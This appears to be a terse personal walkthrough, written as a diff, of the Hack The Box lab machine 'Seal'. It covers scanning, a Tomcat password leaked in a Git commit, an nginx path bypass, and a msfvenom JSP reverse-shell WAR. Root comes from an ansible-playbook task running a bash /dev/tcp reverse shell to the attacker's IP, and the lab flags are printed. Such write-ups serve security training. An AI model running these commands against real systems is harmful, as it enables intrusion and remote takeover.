@@ -1,0 +1,294 @@
+let's enumerate first
+command: sudo rustscan -a 10.10.10.250
+result:
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+443/tcp  open  https      syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,443,8080 10.10.10.250
+result:
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 00:56 WIB
+Nmap scan report for seal.htb (10.10.10.250)
+Host is up (0.038s latency).
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4b894739673d07315e3f4c27411ff967 (RSA)
+|   256 04a74f399565c5b08dd5492ed8440036 (ECDSA)
+|_  256 b45e8393c54249de7125927123b18554 (ED25519)
+443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
+|_ssl-date: TLS randomness does not represent time
+| tls-nextprotoneg: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
+| Not valid before: 2021-05-05T10:24:03
+|_Not valid after:  2022-05-05T10:24:03
+|_http-title: Seal Market
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+8080/tcp open  http-proxy
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 401 Unauthorized
+|     Date: Wed, 28 Jun 2023 17:56:08 GMT
+|     Set-Cookie: JSESSIONID=node095ezzflm5n3myu4kfa0yd8ep40.node0; Path=/; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 0
+|   GetRequest: 
+|     HTTP/1.1 401 Unauthorized
+|     Date: Wed, 28 Jun 2023 17:56:07 GMT
+|     Set-Cookie: JSESSIONID=node0155d88xrh28ajgjpphouyibv438.node0; Path=/; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Wed, 28 Jun 2023 17:56:07 GMT
+|     Set-Cookie: JSESSIONID=node01pkbg94kq8n1v19are1l313tu139.node0; Path=/; HttpOnly
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Content-Type: text/html;charset=utf-8
+|     Allow: GET,HEAD,POST,OPTIONS
+|     Content-Length: 0
+|   RPCCheck: 
+|     HTTP/1.1 400 Illegal character OTEXT=0x80
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 71
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
+|   RTSPRequest: 
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
+|   Socks4: 
+|     HTTP/1.1 400 Illegal character CNTL=0x4
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
+|   Socks5: 
+|     HTTP/1.1 400 Illegal character CNTL=0x5
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Server returned status 401 but no WWW-Authenticate header.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.93%I=7%D=6/29%Time=649C7438%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,F5,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Wed,\x2028\x2
+SF:0Jun\x202023\x2017:56:07\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0155d8
+SF:8xrh28ajgjpphouyibv438\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Th
+SF:u,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/htm
+SF:l;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,10A,"HT
+SF:TP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2028\x20Jun\x202023\x2017:56:07\
+SF:x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01pkbg94kq8n1v19are1l313tu139\.
+SF:node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\
+SF:x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow
+SF::\x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
+SF:est,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text
+SF:/html;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20clo
+SF:se\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Vers
+SF:ion</pre>")%r(FourOhFourRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\
+SF:nDate:\x20Wed,\x2028\x20Jun\x202023\x2017:56:08\x20GMT\r\nSet-Cookie:\x
+SF:20JSESSIONID=node095ezzflm5n3myu4kfa0yd8ep40\.node0;\x20Path=/;\x20Http
+SF:Only\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nCon
+SF:tent-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")
+SF:%r(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nC
+SF:ontent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r
+SF:\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason
+SF::\x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x2
+SF:0400\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;
+SF:charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n
+SF:\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\
+SF:x20CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20chara
+SF:cter\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\n
+SF:Content-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message
+SF:\x20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+command: wfuzz -u https://10.10.10.250 -H 'Host: FUZZ.seal.htb' -w /snap/seclists/34/Discovery/DNS/subdomains-top1million-20000.txt --hh 19737
+result:
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                     
+=====================================================================
+
+000000689:   400        16 L     122 W      2250 Ch     "gc._msdcs"                 
+000009532:   400        14 L     100 W      1949 Ch     "#www"                      
+000010581:   400        14 L     100 W      1949 Ch     "#mail"                     
+000019834:   400        14 L     100 W      1949 Ch     "_domainkey" 
+
+access: https://seal.htb/
+access: https://seal.htb/index.php
+result:
+tomcat
+
+command: ./feroxbuster -u https://seal.htb -k -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt
+result:
+404      GET        1l       63w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+302      GET        0l        0w        0c https://seal.htb/js => http://seal.htb/js/
+302      GET        0l        0w        0c https://seal.htb/css => http://seal.htb/css/
+302      GET        0l        0w        0c https://seal.htb/images => http://seal.htb/images/
+302      GET        0l        0w        0c https://seal.htb/admin => http://seal.htb/admin/
+200      GET      213l     1380w    11324c https://seal.htb/js/jquery-3.0.0.min.js
+200      GET       11l       80w     3899c https://seal.htb/images/test_con.png
+200      GET      334l      803w     8120c https://seal.htb/css/responsive.css
+200      GET      372l     1184w     8992c https://seal.htb/js/custom.js
+200      GET      518l     1140w    19737c https://seal.htb/index.html
+200      GET      102l      621w    48958c https://seal.htb/images/tes.jpg
+200      GET     1594l     3418w    34042c https://seal.htb/css/style.css
+200      GET        6l      352w    19190c https://seal.htb/js/popper.min.js
+200      GET      242l     1313w    65160c https://seal.htb/images/loading.gif
+200      GET      114l      580w    69032c https://seal.htb/images/about.jpg
+200      GET      185l      965w    76565c https://seal.htb/images/v2.jpg
+200      GET      139l      992w    82850c https://seal.htb/images/v1.jpg
+200      GET        1l      870w    42839c https://seal.htb/css/jquery.mCustomScrollbar.min.css
+200      GET        5l      478w    45479c https://seal.htb/js/jquery.mCustomScrollbar.concat.min.js
+302      GET        0l        0w        0c https://seal.htb/manager => http://seal.htb/manager/
+200      GET        5l     1287w    87088c https://seal.htb/js/jquery.min.js
+200      GET        7l      896w    70808c https://seal.htb/js/bootstrap.bundle.min.js
+200      GET        7l     1604w   140421c https://seal.htb/css/bootstrap.min.css
+200      GET      679l     3947w   334403c https://seal.htb/images/img2.png
+404      GET        1l       62w      691c https://seal.htb/WEB-INF
+302      GET        0l        0w        0c https://seal.htb/icon => http://seal.htb/icon/
+302      GET        0l        0w        0c https://seal.htb/shell => http://seal.htb/shell/
+200      GET      231l     6041w   636368c https://seal.htb/js/plugin.js
+200      GET      518l     1140w    19737c https://seal.htb/
+404      GET        1l       62w      691c https://seal.htb/META-INF
+404      GET        1l       62w      691c https://seal.htb/web-inf
+400      GET        1l       72w      771c https://seal.htb/[
+400      GET        1l       72w      771c https://seal.htb/plain]
+400      GET        1l       72w      771c https://seal.htb/]
+400      GET        1l       72w      771c https://seal.htb/quote]
+400      GET        1l       72w      771c https://seal.htb/extension]
+400      GET        1l       72w      771c https://seal.htb/[0-9]
+[####################] - 16s    30028/30028   0s      found:36      errors:1      
+[####################] - 15s    30000/30000   1964/s  https://seal.htb/
+
+command: curl -k -I https://seal.htb/manager/   
+HTTP/1.1 302 
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 28 Jun 2023 18:03:21 GMT
+Content-Type: text/html
+Connection: keep-alive
+Location: http://seal.htb/manager/html
+
+command: curl -k -I https://seal.htb/manager/html
+HTTP/1.1 403 Forbidden
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 28 Jun 2023 18:03:44 GMT
+Content-Type: text/html
+Content-Length: 162
+Connection: keep-alive
+
+command: ./feroxbuster -k -u https://seal.htb/admin/ -w /snap/seclists/34/Discovery/Web-Content/raft-medium-directories.txt
+result:
+404      GET        1l       63w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        7l       10w      162c https://seal.htb/admin/dashboard
+400      GET        1l       72w      771c https://seal.htb/admin/[
+400      GET        1l       72w      771c https://seal.htb/admin/plain]
+400      GET        1l       72w      771c https://seal.htb/admin/]
+400      GET        1l       72w      771c https://seal.htb/admin/quote]
+403      GET        7l       10w      162c https://seal.htb/admin/dashboards
+400      GET        1l       72w      771c https://seal.htb/admin/extension]
+400      GET        1l       72w      771c https://seal.htb/admin/[0-9]
+[####################] - 17s    30002/30002   0s      found:8       errors:0      
+[####################] - 17s    30000/30000   1815/s  https://seal.htb/admin/ 
+
+access: http://10.10.10.250:8080/signin;jsessionid=node0c7azhexymy1n1blgkez2i8dob75.node0?redirect=%2F
+please register and login.
+access: http://10.10.10.250:8080/dashboard/repos
+access: http://10.10.10.250:8080/root/seal_market
+access: http://10.10.10.250:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7
+result:
+<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
+access: http://10.10.10.250:8080/root/seal_market/blob/master/nginx/sites-enabled/default
+some exploit this config, pleaase read this:
+https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+
+access:https://seal.htb/manager;name=0xdf/html
+username: tomcat
+password: 42MrHBf*z8{Z%
+
+command: msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.19 LPORT=7979 -f war -o shell.war
+please upload war to tomcat.
+command: nc -lvnp 7979
+please access /shell Path
+
+upgrade the shell.
+command: cd /opt/backups/playbook
+command: cat run.yml
+result:
+- hosts: localhost
+  tasks:
+  - name: Copy Files
+    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
+  - name: Server Backups
+    archive:
+      path: /opt/backups/files/
+      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
+  - name: Clean
+    file:
+      state: absent
+      path: /opt/backups/files/
+
+command: cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard
+command: find . -writable
+result:
+/uploads
+
+command: ln -s /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/
+command: cd /opt/backups/archives
+
+please move size biggest -rw-rw-r-- 1 luis luis 115600773 Jun 28 18:23 backup-2023-06-28-18:23:33.gz
+to /dev/shm
+gunzip the file and 
+command: tar xf backup-2023-06-28-18\:23\:33 --force-local
+
+command: cd /dev/shm/dashboard/uploads/luis
+command: cat user.txt
+2d80682807528d6dc9b48756649ead70
+
+command: /dev/shm/dashboard/uploads/luis/.ssh
+let's copy id_rsa to luis_rsa
+command: chmod 600 luis_rsa
+command: ssh -i luis_rsa luis@10.10.10.250
+
+command: sudo -l
+Matching Defaults entries for luis on seal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User luis may run the following commands on seal:
+    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
+
+command: /opt/backups/playbook
+copy run.yml to /dev/shm
+change it to this:
+- hosts: localhost
+  tasks:
+  - name: rev
+    shell: bash -c 'bash -i >& /dev/tcp/10.10.16.19/4444 0>&1'
+
+command: nc -lvnp 4444
+command: sudo ansible-playbook run.yml
+
+command: cd /root
+command: cat root.txt
+command: cat root.txt
+f6ff78ad8518a5abde5046c0792df701
+
+resource:
+https://0xdf.gitlab.io/2021/11/13/htb-seal.html#box-info
+https://www.hackingarticles.in/seal-hackthebox-walkthrough/
